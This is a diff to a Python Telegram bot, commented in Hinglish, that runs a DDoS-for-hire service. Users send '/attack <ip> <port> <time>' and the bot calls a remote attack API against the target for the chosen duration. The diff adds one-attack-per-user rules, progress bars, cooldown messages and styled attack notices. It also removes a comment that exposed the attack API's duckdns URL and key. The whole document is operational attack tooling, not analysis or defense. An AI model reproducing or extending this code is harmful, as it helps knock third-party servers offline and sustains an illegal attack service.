@@ -122,7 +122,6 @@ def set_private_channel_id(cid):
 
 
 # ===== NEW API TEMPLATE (2 SLOTS) =====
-# Format: http://mahakaldak.duckdns.org:5000/?key=@mahakal1814&ip=1.1.1.1&port=80&time=60
 API_TEMPLATE = f"{API_BASE_URL}?key={API_KEY}&ip={{ip}}&port={{port}}&time={{duration}}"
 API_LIST = [API_TEMPLATE for _ in range(API_SLOTS)]
 
@@ -546,6 +545,28 @@ def user_has_active_attack(user_id):
         return False
 
 
+def get_user_active_attack(user_id):
+    """User ka active attack details return karo, warna None"""
+    with _attack_lock:
+        now = datetime.now()
+        for attack_id, attack in list(active_attacks.items()):
+            if attack['end_time'] <= now:
+                continue
+            if attack.get('user_id') == user_id:
+                return attack
+    return None
+
+
+def make_progress_bar(percent, length=20):
+    """Progress bar string banao"""
+    filled = int(percent / (100 / length))
+    if filled > length:
+        filled = length
+    if filled < 0:
+        filled = 0
+    return "█" * filled + "▒" * (length - filled)
+
+
 def get_free_api_index():
     with _attack_lock:
         now = datetime.now()
@@ -594,21 +615,26 @@ def _call_single_api(slot_index, url, target, port, duration):
 
 
 def generate_attack_start_ui(target, port, duration, user_id):
-    return f'''🚀 Attack Started!
-📍 {target}:{port}
-⏱ Duration: {duration}s
-👤 User: {user_id}
-📊 Monitor: Type /status to see live progress'''
+    return f'''🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗! 🚀
+━━━━━━━━━━━━━━━━━━━━
+🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}
+⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration}s
+👤 𝗨𝘀𝗲𝗿: {user_id}
+━━━━━━━━━━━━━━━━━━━━
+📊 Live progress dekhne ke liye /status bhejo
+⏳ Attack complete hone tak wait karo'''
 
 
 def generate_attack_complete_ui(target, port, duration, show_private_link=False):
-    msg = f'''🚀 Attack Finished!
-📍 {target}:{port}
-⏱ Duration: {duration}s
-📝 Please submit feedback'''
+    msg = f'''✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗! ✅
+━━━━━━━━━━━━━━━━━━━━
+🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}
+⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration}s
+━━━━━━━━━━━━━━━━━━━━
+📸 𝗔𝗯 𝘀𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗯𝗵𝗲𝗷𝗼 (feedback)
+⏳ Agli attack ke liye ready ho jao'''
     if show_private_link:
         msg += f'''
-
 
 ━━━━━━━━━━━━━━━━━━━━
 📢 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗖𝗛𝗔𝗡𝗡𝗘𝗟
@@ -701,7 +727,7 @@ def start_attack(target, port, duration, message, attack_id, api_index, is_group
 
 
 # ============================================================
-# ===== ✅ /status COMMAND =====
+# ===== ✅ /status COMMAND (User apna, Owner sab) =====
 # ============================================================
 @bot.message_handler(commands=["status"])
 def status_command(message):
@@ -709,9 +735,47 @@ def status_command(message):
         return
     if check_banned(message):
         return
+
+    user_id = message.from_user.id
+
     try:
-        status_text = generate_global_status_ui()
-        bot.reply_to(message, status_text)
+        # Owner ko sab attacks dikhao
+        if is_owner(user_id):
+            status_text = generate_global_status_ui()
+            bot.reply_to(message, status_text)
+            return
+
+        # Normal user ko apna attack dikhao
+        active = get_user_active_attack(user_id)
+        if not active:
+            bot.reply_to(
+                message,
+                f"📊 𝗞𝗼𝗶 𝗔𝗰𝘁𝗶𝘃𝗲 𝗔𝘁𝘁𝗮𝗰𝗸 𝗡𝗮𝗵𝗶 𝗛𝗮𝗶\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"🚀 Attack start karne ke liye:\n"
+                f"`/attack <ip> <port> <time>`",
+                parse_mode="Markdown"
+            )
+            return
+
+        remaining = int((active['end_time'] - datetime.now()).total_seconds())
+        total = active['duration']
+        elapsed = total - remaining
+        percent = int((elapsed / total) * 100) if total > 0 else 0
+        bar = make_progress_bar(percent)
+
+        bot.reply_to(
+            message,
+            f"📊 𝗬𝗢𝗨𝗥 𝗔𝗖𝗧𝗜𝗩𝗘 𝗔𝗧𝗧𝗔𝗖𝗞 📊\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"💢 𝗧𝗮𝗿𝗴𝗲𝘁: `{active['target']}:{active['port']}`\n"
+            f"⏱️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining}s / {total}s\n"
+            f"📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {bar} {percent}%\n"
+            f"🕐 𝗦𝘁𝗮𝗿𝘁𝗲𝗱: {active['start_time'].strftime('%H:%M:%S')}\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"⏳ Attack complete hone ka wait karo.",
+            parse_mode="Markdown"
+        )
     except Exception as e:
         print(f"Status error: {e}", flush=True)
         bot.reply_to(message, f"❌ Status error: {e}")
@@ -1039,59 +1103,128 @@ def feedback_off_command(message):
     bot.reply_to(message, "✅ Feedback disabled!")
 
 
+# ============================================================
+# ===== ✅ /attack COMMAND (1 USER = 1 ATTACK) =====
+# ============================================================
 @bot.message_handler(commands=["attack"])
 def handle_attack(message):
     if check_maintenance(message): return
     if check_banned(message): return
+
     user_id = message.from_user.id
     is_group = message.chat.type not in ['private', 'personal']
 
+    # Group approval check
     if is_group:
         if not check_group_approval(message):
             return
 
+    # DDoS protection
     if protection.is_ddos_attack(user_id, message.chat.id):
         bot.reply_to(message, "🚫 DDoS Protection: Too many requests! Wait 5 seconds.")
         return
+
+    # Channel join check
     if not check_channel_join(message):
         return
 
-    if get_feedback_enabled() and not is_owner(user_id):
-        fb = get_pending_feedback(user_id)
-        if fb:
-            bot.reply_to(message, f"📸 Pehle attack ka screenshot bhejo!\n🎯 {fb['target']}:{fb['port']}")
-            return
+    # ===== ✅ 1 USER = 1 ATTACK CHECK (Owner bypass) =====
+    if not is_owner(user_id):
+
+        # 1. Pending feedback check
+        if get_feedback_enabled():
+            fb = get_pending_feedback(user_id)
+            if fb:
+                bot.reply_to(
+                    message,
+                    f"📸 𝗣𝗘𝗛𝗟𝗘 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗕𝗛𝗘𝗝𝗢!\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                    f"🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {fb['target']}:{fb['port']}\n"
+                    f"⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {fb['duration']}s\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                    f"⏳ Screenshot bhejne ke baad hi naya attack kar sakte ho."
+                )
+                return
+
+        # 2. Cooldown check
         cooldown = get_user_cooldown(user_id, is_group)
         if cooldown > 0:
-            bot.reply_to(message, f"⏳ Cooldown active! Wait: {cooldown}s")
-            return
-        if user_has_active_attack(user_id):
-            bot.reply_to(message, "❌ Tumhara pehle se ek attack chal raha hai!")
+            mins = cooldown // 60
+            secs = cooldown % 60
+            time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
+            bot.reply_to(
+                message,
+                f"⏳ 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 𝗔𝗖𝗧𝗜𝗩𝗘!\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"🕐 𝗪𝗮𝗶𝘁 𝗸𝗮𝗿𝗼: {time_str}\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"⏱️ Cooldown khatam hone ke baad attack kar sakte ho."
+            )
             return
 
+        # 3. ✅ ACTIVE ATTACK CHECK (main rule)
+        active = get_user_active_attack(user_id)
+        if active:
+            remaining = int((active['end_time'] - datetime.now()).total_seconds())
+            total = active['duration']
+            elapsed = total - remaining
+            percent = int((elapsed / total) * 100) if total > 0 else 0
+            bar = make_progress_bar(percent)
+
+            bot.reply_to(
+                message,
+                f"🚫 𝗘𝗞 𝗧𝗜𝗠𝗘 𝗣𝗘 𝗘𝗞 𝗛𝗜 𝗔𝗧𝗧𝗔𝗖𝗞! 🚫\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"💢 𝗔𝗰𝘁𝗶𝘃𝗲 𝗧𝗮𝗿𝗴𝗲𝘁: `{active['target']}:{active['port']}`\n"
+                f"⏱️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining}s / {total}s\n"
+                f"📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {bar} {percent}%\n\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+                f"⏳ Pehle wale attack ke complete hone ka wait karo.\n"
+                f"📊 Live status: /status",
+                parse_mode="Markdown"
+            )
+            return
+
+    # ===== SLOT AVAILABILITY CHECK =====
     active_count = get_active_attack_count()
     max_concurrent = len(API_LIST)
     if active_count >= max_concurrent:
-        bot.reply_to(message, f"❌ Sabhi slots busy! ({active_count}/{max_concurrent})")
+        bot.reply_to(
+            message,
+            f"❌ 𝗦𝗔𝗕𝗛𝗜 𝗦𝗟𝗢𝗧𝗦 𝗕𝗨𝗦𝗬! ({active_count}/{max_concurrent})\n"
+            f"⏳ Thodi der baad try karo."
+        )
         return
 
+    # ===== COMMAND PARSE =====
     command_parts = message.text.split()
     if len(command_parts) != 4:
-        bot.reply_to(message, "⚠️ Usage: /attack <ip> <port> <time>")
+        bot.reply_to(
+            message,
+            "⚠️ 𝗨𝘀𝗮𝗴𝗲: `/attack <ip> <port> <time>`\n"
+            "📌 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: `/attack 1.1.1.1 80 60`",
+            parse_mode="Markdown"
+        )
         return
 
     target, port, duration = command_parts[1], command_parts[2], command_parts[3]
+
+    # IP validate
     if not validate_target(target):
-        bot.reply_to(message, "❌ Invalid IP!")
+        bot.reply_to(message, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗜𝗣!\n📌 Example: `1.1.1.1`", parse_mode="Markdown")
         return
+
+    # IP blocked check
     if is_ip_blocked(target):
-        bot.reply_to(message, "🚫 Ye IP blocked hai!")
+        bot.reply_to(message, f"🚫 𝗬𝗲 𝗜𝗣 𝗯𝗹𝗼𝗰𝗸𝗲𝗱 𝗵𝗮𝗶!\n🎯 {target}")
         return
+
     try:
         port = int(port)
         if port < 1 or port > 65535:
-            bot.reply_to(message, "❌ Invalid port!")
+            bot.reply_to(message, "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗣𝗼𝗿𝘁! (1-65535)")
             return
+
         duration = int(duration)
         if is_group:
             max_time = get_group_max_attack_time()
@@ -1099,14 +1232,28 @@ def handle_attack(message):
         else:
             max_time = get_private_max_attack_time()
             cooldown_time = get_private_cooldown()
+
         if not is_owner(user_id) and duration > max_time:
-            bot.reply_to(message, f"❌ Max time: {max_time}s")
+            bot.reply_to(
+                message,
+                f"❌ 𝗠𝗔𝗫 𝗧𝗜𝗠𝗘 𝗘𝗫𝗖𝗘𝗘𝗗𝗘𝗗!\n"
+                f"⏱️ Max allowed: {max_time}s\n"
+                f"📌 Tumne diya: {duration}s"
+            )
             return
+
+        if duration < 1:
+            bot.reply_to(message, "❌ Duration kam se kam 1s hona chahiye!")
+            return
+
+        # Free slot lo
         attack_id = f"{user_id}_{datetime.now().timestamp()}"
         api_index = get_free_api_index()
         if api_index is None:
-            bot.reply_to(message, "❌ Koi free slot nahi mila!")
+            bot.reply_to(message, "❌ 𝗞𝗼𝗶 𝗳𝗿𝗲𝗲 𝘀𝗹𝗼𝘁 𝗻𝗮𝗵𝗶 𝗺𝗶𝗹𝗮!\n⏳ Thodi der baad try karo.")
             return
+
+        # Register attack
         with _attack_lock:
             user_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time + duration)
             api_in_use[attack_id] = api_index
@@ -1119,11 +1266,16 @@ def handle_attack(message):
                 'end_time': datetime.now() + timedelta(seconds=duration),
                 'is_group': is_group
             }
-        thread = threading.Thread(target=start_attack,
-                                  args=(target, port, duration, message, attack_id, api_index, is_group))
+
+        # Attack start karo
+        thread = threading.Thread(
+            target=start_attack,
+            args=(target, port, duration, message, attack_id, api_index, is_group)
+        )
         thread.start()
+
     except ValueError:
-        bot.reply_to(message, "❌ Port and time must be numbers!")
+        bot.reply_to(message, "❌ 𝗣𝗼𝗿𝘁 𝗮𝘂𝗿 𝘁𝗶𝗺𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗵𝗼𝗻𝗲 𝗰𝗵𝗮𝗵𝗶𝘆𝗲!")
 
 
 @bot.message_handler(commands=['help'])
